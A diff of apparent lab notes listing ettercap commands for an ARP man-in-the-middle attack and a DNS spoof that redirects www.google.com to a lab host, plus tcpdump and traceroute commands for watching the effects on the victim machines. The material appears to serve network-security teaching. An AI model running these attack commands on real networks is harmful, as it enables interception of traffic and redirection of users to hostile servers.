@@ -1,15 +1,17 @@
 # Ettercap 
 # On attacker machine
-# Scan for host
-ettercap --text --iface eth0 --nosslmitm --nopromisc --quiet
 # MitM attack
 ettercap --text --iface eth0 --nosslmitm --nopromisc --only-mitm --mitm arp /10.1.2.2/// /10.1.2.3///
 
 # On cache machine
-tcpdump -nn -i eth1 arp
+sudo tcpdump -nn -i eth1 arp
+sudo traceroute -n 10.1.2.3
 
 # On auth machine
-tcpdump -nn -i eth0 arp
+sudo tcpdump -nn -i eth0 arp
+sudo traceroute -n 10.1.2.2
 
+# At the bottom of /etc/ettercap/etter.dns add
+www.google.com A 10.1.2.4
 # Dns spoof attack
 ettercap --text --iface eth0 --nosslmitm --nopromisc --plugin dns_spoof --mitm arp /10.1.2.2/// /10.1.2.3///
